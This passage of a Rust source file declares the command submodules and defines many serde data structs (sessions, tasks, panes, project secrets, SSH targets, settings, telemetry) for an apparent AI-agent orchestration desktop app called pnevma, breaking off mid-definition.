// Submodule declarations
pub mod agents;
pub mod analytics;
pub mod browser_tools;
pub mod ci;
pub mod global_agents;
pub mod global_workflow;
pub mod harness_config;
pub mod intake;
pub mod plan_tools;
pub mod pr;
pub mod project;
pub mod provider_usage;
pub mod secrets;
pub mod ssh;
pub mod system_resources;
pub mod tasks;
pub mod telemetry;
pub mod tracker;
pub mod tracker_tools;
pub mod usage_local;
pub mod workflow;

// Re-export all command functions from submodules
pub use self::agents::*;
pub use self::analytics::*;
pub use self::ci::*;
pub use self::global_agents::*;
pub use self::global_workflow::*;
pub use self::harness_config::*;
pub use self::intake::*;
pub use self::plan_tools::*;
pub use self::pr::*;
pub use self::project::*;
pub use self::provider_usage::*;
pub use self::secrets::*;
pub use self::ssh::*;
pub use self::system_resources::*;
pub use self::tasks::*;
pub use self::telemetry::*;
pub use self::tracker::*;
pub use self::usage_local::*;
pub use self::workflow::*;

// ── Shared types, helpers, and utilities ──────────────────────────────────────

use crate::command_registry::{default_registry, RegisteredCommand};
use crate::control::resolve_control_plane_settings;
use crate::event_emitter::EventEmitter;
use crate::state::{AppState, ProjectContext, RecentProject};
use chrono::{DateTime, Utc};
use pnevma_agents::{AgentConfig, AgentEvent, DispatchPool, TaskPayload};
use pnevma_core::{
    global_config_path, load_global_config, load_project_config, save_global_config, Check,
    CheckType, GlobalConfig, Priority, ProjectConfig, TaskContract, TaskStatus, WorkflowDef,
    WorkflowDocument, WorkflowHooks,
};
use pnevma_db::{
    sha256_hex, ArtifactRow, CheckResultRow, CheckRunRow, CheckpointRow, Db, EventQueryFilter,
    EventRow, FeedbackRow, MergeQueueRow, NewEvent, NotificationRow, OnboardingStateRow,
    PaneLayoutTemplateRow, PaneRow, ReviewRow, RuleRow, SessionRestoreLogRow, SessionRow,
    SshProfileRow, TaskRow, TelemetryEventRow, TrustRecord, WorkflowInstanceRow, WorkflowRow,
};
use pnevma_git::{parse_hook_defs, run_hooks, GitService, HookPhase};
use pnevma_redaction::{
    normalize_secrets as shared_normalize_secrets, redact_json_value as shared_redact_json_value,
    redact_text as shared_redact_text, StreamRedactionBuffer,
};
use pnevma_session::{
    ScrollbackSlice, SessionEvent, SessionHealth, SessionMetadata, SessionStatus, SessionSupervisor,
};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};
use std::sync::{Arc, OnceLock, RwLock as StdRwLock};
use tokio::process::Command as TokioCommand;
use tokio::sync::RwLock;
use tokio::time::{timeout, Duration};
use uuid::Uuid;

const REMOTE_SESSION_STATUS_STARTUP_GRACE_WINDOW_SECS: i64 = 3;
const REMOTE_SESSION_STATUS_STARTUP_RETRIES: usize = 4;
const REMOTE_SESSION_STATUS_STARTUP_RETRY_DELAY: Duration = Duration::from_millis(250);

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionInput {
    pub name: String,
    pub cwd: String,
    pub command: String,
    #[serde(default)]
    pub remote_target: Option<SessionRemoteTargetInput>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct SessionRemoteTargetInput {
    pub ssh_profile_id: String,
    pub ssh_profile_name: String,
    pub host: String,
    pub port: u16,
    #[serde(default)]
    pub user: Option<String>,
    #[serde(default)]
    pub identity_file: Option<String>,
    #[serde(default)]
    pub proxy_jump: Option<String>,
    pub remote_path: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PaneInput {
    pub id: Option<String>,
    pub session_id: Option<String>,
    pub r#type: String,
    pub position: String,
    pub label: String,
    pub metadata_json: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PaneLayoutTemplatePane {
    pub id: String,
    pub session_id: Option<String>,
    pub r#type: String,
    pub position: String,
    pub label: String,
    pub metadata_json: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PaneLayoutTemplateView {
    pub id: String,
    pub name: String,
    pub display_name: String,
    pub is_system: bool,
    pub panes: Vec<PaneLayoutTemplatePane>,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SavePaneLayoutTemplateInput {
    pub name: String,
    pub display_name: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApplyPaneLayoutTemplateInput {
    pub name: String,
    #[serde(default)]
    pub force: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UnsavedPaneReplacementView {
    pub pane_id: String,
    pub pane_label: String,
    pub pane_type: String,
    pub reason: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApplyPaneLayoutTemplateResult {
    pub applied: bool,
    pub template_name: String,
    pub replaced_panes: Vec<String>,
    pub unsaved_replacements: Vec<UnsavedPaneReplacementView>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct QueryEventsInput {
    pub event_type: Option<String>,
    pub session_id: Option<String>,
    pub task_id: Option<String>,
    pub from: Option<String>,
    pub to: Option<String>,
    pub limit: Option<i64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SearchProjectInput {
    pub query: String,
    pub limit: Option<usize>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SearchResultView {
    pub id: String,
    pub source: String,
    pub title: String,
    pub snippet: String,
    pub path: Option<String>,
    pub task_id: Option<String>,
    pub session_id: Option<String>,
    pub timestamp: Option<DateTime<Utc>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ListProjectFilesInput {
    pub query: Option<String>,
    pub limit: Option<usize>,
    pub path: Option<String>,
    pub recursive: Option<bool>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OpenFileTargetInput {
    pub path: String,
    pub mode: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectFilePathInput {
    pub path: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectFileView {
    pub path: String,
    pub status: String,
    pub modified: bool,
    pub staged: bool,
    pub conflicted: bool,
    pub untracked: bool,
    pub additions: Option<i64>,
    pub deletions: Option<i64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileTreeNodeView {
    pub id: String,
    pub name: String,
    pub path: String,
    pub is_directory: bool,
    pub children: Option<Vec<FileTreeNodeView>>,
    pub size: Option<i64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileOpenResultView {
    pub path: String,
    pub content: String,
    pub truncated: bool,
    pub launched_editor: bool,
    #[serde(default)]
    pub is_binary: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WriteFileInput {
    pub path: String,
    pub content: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileWriteResultView {
    pub path: String,
    pub bytes_written: u64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskDiffInput {
    pub task_id: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DiffHunkView {
    pub header: String,
    pub lines: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DiffFileView {
    pub path: String,
    pub hunks: Vec<DiffHunkView>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskDiffView {
    pub task_id: String,
    pub diff_path: String,
    pub files: Vec<DiffFileView>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionTimelineInput {
    pub session_id: String,
    pub limit: Option<i64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionRecoveryInput {
    pub session_id: String,
    pub action: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DraftTaskInput {
    pub text: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ScrollbackInput {
    pub session_id: String,
    pub offset: Option<u64>,
    pub limit: Option<usize>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CreateTaskInput {
    pub title: String,
    pub goal: String,
    pub scope: Vec<String>,
    pub acceptance_criteria: Vec<String>,
    #[serde(default)]
    pub constraints: Vec<String>,
    #[serde(default)]
    pub dependencies: Vec<String>,
    pub priority: String,
    #[serde(default)]
    pub auto_dispatch: Option<bool>,
    #[serde(default)]
    pub agent_profile_override: Option<String>,
    #[serde(default)]
    pub execution_mode: Option<String>,
    #[serde(default)]
    pub timeout_minutes: Option<i64>,
    #[serde(default)]
    pub max_retries: Option<i64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct UpdateTaskInput {
    pub id: String,
    pub title: Option<String>,
    pub goal: Option<String>,
    pub scope: Option<Vec<String>>,
    pub acceptance_criteria: Option<Vec<String>>,
    pub constraints: Option<Vec<String>>,
    pub dependencies: Option<Vec<String>>,
    pub priority: Option<String>,
    pub status: Option<String>,
    pub handoff_summary: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskView {
    pub id: String,
    pub project_id: String,
    pub title: String,
    pub goal: String,
    pub scope: Vec<String>,
    pub dependencies: Vec<String>,
    pub acceptance_criteria: Vec<Check>,
    pub constraints: Vec<String>,
    pub priority: String,
    pub status: String,
    pub branch: Option<String>,
    pub worktree_id: Option<String>,
    pub handoff_summary: Option<String>,
    pub auto_dispatch: bool,
    pub agent_profile_override: Option<String>,
    pub execution_mode: Option<String>,
    pub timeout_minutes: Option<i64>,
    pub max_retries: Option<i64>,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
    pub queued_position: Option<usize>,
    pub cost_usd: Option<f64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WorktreeView {
    pub id: String,
    pub task_id: String,
    pub path: String,
    pub branch: String,
    pub lease_status: String,
    pub lease_started: DateTime<Utc>,
    pub last_active: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectStatusView {
    pub project_id: String,
    pub project_name: String,
    pub project_path: String,
    pub checkout_path: String,
    pub sessions: usize,
    pub tasks: usize,
    pub worktrees: usize,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub automation: Option<AutomationStatusView>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectOpenResponse {
    pub project_id: String,
    pub status: ProjectStatusView,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionNewResponse {
    pub session_id: String,
    pub binding: SessionBindingView,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectSummaryView {
    pub project_id: String,
    pub git_branch: Option<String>,
    pub active_tasks: usize,
    pub active_agents: usize,
    pub cost_today: f64,
    pub unread_notifications: usize,
    pub diff_insertions: Option<i64>,
    pub diff_deletions: Option<i64>,
    pub linked_pr_number: Option<u64>,
    pub linked_pr_url: Option<String>,
    pub ci_status: Option<String>,
    pub attention_reason: Option<String>,
    pub git_dirty: Option<bool>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PRResolveView {
    pub number: u64,
    pub title: String,
    pub head_ref: String,
    pub base_ref: String,
    pub url: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct IssueResolveView {
    pub number: u64,
    pub title: String,
    pub url: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WorkspaceLaunchSourceView {
    pub kind: String,
    pub number: i64,
    pub title: String,
    pub url: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WorkspaceOpenerBranchView {
    pub name: String,
    pub has_worktree: bool,
    pub worktree_path: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct WorkspaceOpenerLaunchResult {
    pub project_path: String,
    pub checkout_path: String,
    pub workspace_name: String,
    pub launch_source: WorkspaceLaunchSourceView,
    pub working_directory: Option<String>,
    pub task_id: Option<String>,
    pub branch: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FileChangeView {
    pub path: String,
    pub additions: i64,
    pub deletions: i64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CheckSummaryView {
    pub total: usize,
    pub passed: usize,
    pub failed: usize,
    pub running: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MergeReadinessView {
    pub is_ready: bool,
    pub blockers: Vec<String>,
    pub required_checks: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommitAndPushView {
    pub success: bool,
    pub commit_sha: Option<String>,
    pub push_error: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GitCommitView {
    pub success: bool,
    pub commit_sha: Option<String>,
    pub error_message: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct GitPushView {
    pub success: bool,
    pub error_message: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PortEntryView {
    pub port: u16,
    pub pid: u32,
    pub process_name: String,
    pub workspace_name: Option<String>,
    pub session_id: Option<String>,
    pub label: Option<String>,
    pub protocol: String,
    pub detected_at: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandCenterSummaryView {
    pub active_count: usize,
    pub queued_count: usize,
    pub idle_count: usize,
    pub stuck_count: usize,
    pub review_needed_count: usize,
    pub failed_count: usize,
    pub retrying_count: usize,
    pub slot_limit: usize,
    pub slot_in_use: usize,
    pub cost_today_usd: f64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandCenterRunView {
    pub id: String,
    pub task_id: Option<String>,
    pub task_title: Option<String>,
    pub task_status: Option<String>,
    pub session_id: Option<String>,
    pub session_name: Option<String>,
    pub session_status: Option<String>,
    pub session_health: Option<String>,
    pub provider: Option<String>,
    pub model: Option<String>,
    pub agent_profile: Option<String>,
    pub branch: Option<String>,
    pub worktree_id: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub primary_file_path: Option<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub scope_paths: Vec<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub worktree_path: Option<String>,
    pub state: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub attention_reason: Option<String>,
    pub started_at: DateTime<Utc>,
    pub last_activity_at: DateTime<Utc>,
    pub retry_count: i64,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub retry_after: Option<DateTime<Utc>>,
    pub cost_usd: f64,
    pub tokens_in: i64,
    pub tokens_out: i64,
    pub available_actions: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CommandCenterSnapshotView {
    pub project_id: String,
    pub project_name: String,
    pub project_path: String,
    pub generated_at: DateTime<Utc>,
    pub summary: CommandCenterSummaryView,
    pub runs: Vec<CommandCenterRunView>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FleetProjectEntryView {
    pub machine_id: String,
    pub project_id: String,
    pub project_name: String,
    pub project_path: String,
    pub state: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub last_opened_at: Option<DateTime<Utc>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub snapshot: Option<CommandCenterSnapshotView>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FleetMachineSummaryView {
    pub project_count: usize,
    pub open_project_count: usize,
    pub active_count: usize,
    pub queued_count: usize,
    pub idle_count: usize,
    pub stuck_count: usize,
    pub review_needed_count: usize,
    pub failed_count: usize,
    pub retrying_count: usize,
    pub slot_limit: usize,
    pub slot_in_use: usize,
    pub cost_today_usd: f64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FleetMachineSnapshotView {
    pub machine_id: String,
    pub machine_name: String,
    pub generated_at: DateTime<Utc>,
    pub summary: FleetMachineSummaryView,
    pub projects: Vec<FleetProjectEntryView>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FleetActionInput {
    pub action: String,
    pub session_id: Option<String>,
    pub task_id: Option<String>,
    pub project_id: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FleetActionResultView {
    pub ok: bool,
    pub action: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub session_id: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskDispatchResponse {
    pub status: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OkResponse {
    pub ok: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct LiveSessionView {
    pub id: String,
    pub name: String,
    #[serde(default = "default_session_backend")]
    pub backend: String,
    #[serde(default = "default_session_durability")]
    pub durability: String,
    #[serde(default = "default_session_lifecycle_state")]
    pub lifecycle_state: String,
    pub status: String,
    pub health: String,
    pub pid: Option<i64>,
    pub cwd: String,
    pub command: String,
    pub started_at: DateTime<Utc>,
    pub last_heartbeat: DateTime<Utc>,
    pub exit_code: Option<i32>,
    pub ended_at: Option<DateTime<Utc>>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct SessionKillResult {
    pub session_id: String,
    pub outcome: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub message: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct SessionKillFailure {
    pub session_id: String,
    pub message: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct SessionKillAllResult {
    pub requested: usize,
    pub killed: usize,
    pub already_gone: usize,
    pub failed: usize,
    pub failures: Vec<SessionKillFailure>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DataRetentionCleanupResponse {
    pub dry_run: bool,
    pub artifacts_pruned: usize,
    pub feedback_artifacts_cleared: usize,
    pub review_packs_pruned: usize,
    pub scrollback_sessions_pruned: usize,
    pub telemetry_exports_pruned: usize,
    pub files_deleted: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TimelineEventView {
    pub timestamp: DateTime<Utc>,
    pub kind: String,
    pub summary: String,
    pub payload: serde_json::Value,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RecoveryOptionView {
    pub id: String,
    pub label: String,
    pub description: String,
    pub enabled: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionEnvVarView {
    pub key: String,
    pub value: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SessionBindingView {
    pub session_id: String,
    #[serde(default = "default_session_backend")]
    pub backend: String,
    #[serde(default = "default_session_durability")]
    pub durability: String,
    #[serde(default = "default_session_lifecycle_state")]
    pub lifecycle_state: String,
    pub mode: String,
    pub cwd: String,
    #[serde(default)]
    pub launch_command: Option<String>,
    pub env: Vec<SessionEnvVarView>,
    pub wait_after_command: bool,
    pub recovery_options: Vec<RecoveryOptionView>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DailyBriefView {
    pub generated_at: DateTime<Utc>,
    pub total_tasks: usize,
    pub ready_tasks: usize,
    pub review_tasks: usize,
    pub blocked_tasks: usize,
    pub failed_tasks: usize,
    pub total_cost_usd: f64,
    pub recent_events: Vec<TimelineEventView>,
    pub recommended_actions: Vec<String>,
    // Extended intelligence fields
    pub active_sessions: usize,
    pub cost_last_24h_usd: f64,
    pub tasks_completed_last_24h: usize,
    pub tasks_failed_last_24h: usize,
    pub stale_ready_count: usize,
    pub longest_running_task: Option<String>,
    pub top_cost_tasks: Vec<TaskCostEntry>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskCostEntry {
    pub task_id: String,
    pub title: String,
    pub cost_usd: f64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DraftTaskView {
    pub title: String,
    pub goal: String,
    pub scope: Vec<String>,
    pub acceptance_criteria: Vec<String>,
    pub constraints: Vec<String>,
    pub dependencies: Vec<String>,
    pub priority: String,
    pub source: String,
    pub warnings: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NotificationInput {
    pub title: String,
    pub body: String,
    pub level: Option<String>,
    #[serde(default)]
    pub task_id: Option<String>,
    #[serde(default)]
    pub session_id: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NotificationListInput {
    #[serde(default)]
    pub unread_only: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NotificationView {
    pub id: String,
    pub task_id: Option<String>,
    pub session_id: Option<String>,
    pub title: String,
    pub body: String,
    pub level: String,
    pub unread: bool,
    pub created_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskCheckResultView {
    pub id: String,
    pub description: String,
    pub check_type: String,
    pub command: Option<String>,
    pub passed: bool,
    pub output: Option<String>,
    pub created_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TaskCheckRunView {
    pub id: String,
    pub task_id: String,
    pub status: String,
    pub summary: Option<String>,
    pub created_at: DateTime<Utc>,
    pub results: Vec<TaskCheckResultView>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReviewPackView {
    pub task_id: String,
    pub status: String,
    pub review_pack_path: String,
    pub reviewer_notes: Option<String>,
    pub approved_at: Option<DateTime<Utc>>,
    pub pack: serde_json::Value,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MergeQueueItemView {
    pub id: String,
    pub task_id: String,
    pub task_title: String,
    pub status: String,
    pub blocked_reason: Option<String>,
    pub approved_at: DateTime<Utc>,
    pub started_at: Option<DateTime<Utc>>,
    pub completed_at: Option<DateTime<Utc>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MoveMergeQueueInput {
    pub task_id: String,
    pub direction: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ReviewDecisionInput {
    pub task_id: String,
    pub note: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectSecretListInput {
    pub scope: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectSecretUpsertInput {
    pub id: Option<String>,
    pub name: String,
    pub scope: String,
    pub backend: String,
    pub value: Option<String>,
    pub env_file_path: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectSecretDeleteInput {
    pub id: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectSecretImportInput {
    pub path: String,
    pub scope: String,
    pub destination_backend: String,
    pub on_conflict: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectSecretExportTemplateInput {
    pub path: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectSecretImportResult {
    pub imported_names: Vec<String>,
    pub skipped_names: Vec<String>,
    pub error_names: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectSecretExportTemplateResult {
    pub path: String,
    pub count: usize,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ProjectSecretView {
    pub id: String,
    pub project_id: Option<String>,
    pub scope: String,
    pub name: String,
    pub backend: String,
    pub location_display: String,
    pub status: String,
    pub status_message: Option<String>,
    pub created_at: DateTime<Utc>,
    pub updated_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CheckpointInput {
    pub description: Option<String>,
    pub task_id: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CheckpointView {
    pub id: String,
    pub task_id: Option<String>,
    pub git_ref: String,
    pub created_at: DateTime<Utc>,
    pub description: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExecuteRegisteredCommandInput {
    pub id: String,
    #[serde(default)]
    pub args: HashMap<String, String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleUpsertInput {
    pub id: Option<String>,
    pub name: String,
    pub content: String,
    pub scope: Option<String>,
    pub active: Option<bool>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleToggleInput {
    pub id: String,
    pub active: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleUsageInput {
    pub rule_id: String,
    pub limit: Option<i64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleView {
    pub id: String,
    pub name: String,
    pub path: String,
    pub scope: String,
    pub active: bool,
    pub content: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleUsageView {
    pub run_id: String,
    pub included: bool,
    pub reason: String,
    pub created_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KnowledgeCaptureInput {
    pub task_id: Option<String>,
    pub kind: String,
    pub title: Option<String>,
    pub content: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ArtifactView {
    pub id: String,
    pub task_id: Option<String>,
    pub r#type: String,
    pub path: String,
    pub description: Option<String>,
    pub created_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KeybindingView {
    pub action: String,
    pub shortcut: String,
    pub is_default: bool,
    pub conflicts_with: Vec<String>,
    pub is_protected: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SetKeybindingInput {
    pub action: String,
    pub shortcut: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OnboardingStateView {
    pub step: String,
    pub completed: bool,
    pub dismissed: bool,
    pub updated_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdvanceOnboardingInput {
    pub step: String,
    pub completed: Option<bool>,
    pub dismissed: Option<bool>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EnvironmentReadinessInput {
    pub path: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct EnvironmentReadinessView {
    pub git_available: bool,
    pub detected_adapters: Vec<String>,
    pub global_config_path: String,
    pub global_config_exists: bool,
    pub project_path: Option<String>,
    pub project_initialized: bool,
    pub missing_steps: Vec<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InitializeGlobalConfigInput {
    pub default_provider: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InitGlobalConfigResultView {
    pub created: bool,
    pub path: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InitializeProjectScaffoldInput {
    pub path: String,
    pub project_name: Option<String>,
    pub project_brief: Option<String>,
    pub default_provider: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InitProjectScaffoldResultView {
    pub root_path: String,
    pub created_paths: Vec<String>,
    pub already_initialized: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TelemetryStatusView {
    pub opted_in: bool,
    pub queued_events: i64,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AppSettingsView {
    pub auto_save_workspace_on_quit: bool,
    pub restore_windows_on_launch: bool,
    pub auto_update: bool,
    pub default_shell: String,
    pub terminal_font: String,
    pub terminal_font_size: u32,
    pub scrollback_lines: u32,
    pub sidebar_background_offset: f64,
    pub bottom_tool_bar_auto_hide: bool,
    pub focus_border_enabled: bool,
    pub focus_border_opacity: f64,
    pub focus_border_width: f64,
    pub focus_border_color: String,
    pub telemetry_enabled: bool,
    pub crash_reports: bool,
    pub keybindings: Vec<KeybindingView>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KeybindingOverride {
    pub action: String,
    pub shortcut: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SetAppSettingsInput {
    pub auto_save_workspace_on_quit: bool,
    pub restore_windows_on_launch: bool,
    pub auto_update: bool,
    pub default_shell: String,
    pub terminal_font: String,
    pub terminal_font_size: u32,
    pub scrollback_lines: u32,
    pub sidebar_background_offset: f64,
    pub bottom_tool_bar_auto_hide: bool,
    pub focus_border_enabled: bool,
    pub focus_border_opacity: f64,
    pub focus_border_width: f64,
    pub focus_border_color: String,
    pub telemetry_enabled: bool,
    pub crash_reports: bool,
    #[serde(default)]
    pub keybindings: Option<Vec<KeybindingOverride>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SetTelemetryInput {
    pub opted_in: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ExportTelemetryInput {
    pub path: Option<String>,
    pub limit: Option<i64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FeedbackInput {
    pub category: String,
    pub body: String,
    pub contact: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FeedbackView {
    pub id: String,
    pub category: String,
    pub body: String,
    pub contact: Option<String>,
    pub artifact_path: Option<String>,
    pub created_at: DateTime<Utc>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PartnerMetricsInput {
    pub days: Option<i64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PartnerMetricsReportView {
    pub generated_at: DateTime<Utc>,
    pub window_days: i64,
    pub sessions_started: i64,
    pub tasks_created: i64,
    pub tasks_done: i64,
    pub merges_completed: i64,
    pub knowledge_captures: i64,
    pub feedback_count: i64,
    pub feedback_with_contact: i64,
    pub telemetry_events: i64,
    pub onboarding_completed: bool,
    pub avg_task_cycle_hours: Option<f64>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AutomationRunView {
    pub id: String,
    pub task_id: String,
    pub run_id: String,
    pub origin: String,
    pub provider: String,
    pub model: Option<String>,
    pub status: String,
    pub attempt: i64,
    pub started_at: DateTime<Utc>,
    pub finished_at: Option<DateTime<Utc>>,
    pub duration_seconds: Option<f64>,
    pub tokens_in: i64,
    pub tokens_out: i64,
    pub cost_usd: f64,
    pub summary: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AutomationStatusView {
    pub enabled: bool,
    pub config_source: String,
    pub poll_interval_seconds: u64,
    pub max_concurrent: usize,
    pub active_runs: usize,
    pub queued_tasks: usize,
